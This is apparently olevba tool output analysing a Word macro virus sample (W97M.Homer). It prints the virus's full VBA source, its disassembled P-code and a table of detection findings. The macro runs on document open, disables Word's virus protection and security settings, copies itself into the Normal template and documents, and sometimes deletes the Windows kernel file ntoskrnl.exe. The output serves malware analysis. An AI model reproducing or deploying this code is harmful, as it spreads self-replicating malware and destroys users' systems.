olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO homer.cls 
in file: Virus.MSWord.Onex.e - OLE stream: 'Macros/VBA/homer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
 On Error Resume Next
 Set Code = New DataObject
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If NormalTemplate.VBProject.VBComponents(1).Name = "homer" Then
    calla = True
   Else
    Set a = NormalTemplate.VBProject.VBComponents(1)
  End If
  If ActiveDocument.VBProject.VBComponents(1).Name = "homer" Then
    callb = True
   Else
    Set a = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
  End If
  Set ab = a.CodeModule
   Code.SetText homer.VBProject.VBComponents(1).CodeModule.Lines(1, homer.VBProject.VBComponents(1).CodeModule.CountOfLines)
   ab.DeleteLines 1, ab.CountOfLines
   ab.InsertLines 1, Code.GetText
   a.Name = "homer"
   If calla = True And callb = True Then
    If Int(Rnd * 150) = 2 Then
      
    End If
   End If
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

On Error Resume Next

DoEvents
Randomize
If Int(Rnd * 150) = 2 Then


If Dir("c:\winnt\system32\ntoskrnl.exe") <> "" Then Kill "c:\winnt\system32\ntoskrnl.exe"



End If

End Sub

'W97M.Homer.a
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Onex.e
' ===============================================================================
' Module streams:
' Macros/VBA/homer - 3328 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	SetStmt 
' 	New <crash>
' 	Set Code 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #7:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "homer"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitVarSpecial (True)
' 	St calla 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set a 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "homer"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (True)
' 	St callb 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set a 
' Line #20:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	SetStmt 
' 	Ld a 
' 	MemLd CodeModule 
' 	Set ab 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld homer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld homer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Code 
' 	ArgsMemCall SetText 0x0001 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld ab 
' 	MemLd CountOfLines 
' 	Ld ab 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	MemLd GetText 
' 	Ld ab 
' 	ArgsMemCall InsertLines 0x0002 
' Line #26:
' 	LitStr 0x0005 "homer"
' 	Ld a 
' 	MemSt New 
' Line #27:
' 	Ld calla 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld callb 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0096 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #29:
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #33:
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' Line #36:
' 	ArgsCall DoEvents 0x0000 
' Line #37:
' 	ArgsCall Read 0x0000 
' Line #38:
' 	Ld Rnd 
' 	LitDI2 0x0096 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #39:
' Line #40:
' Line #41:
' 	LitStr 0x001E "c:\winnt\system32\ntoskrnl.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "c:\winnt\system32\ntoskrnl.exe"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	QuoteRem 0x0000 0x000C "W97M.Homer.a"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |ntoskrnl.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

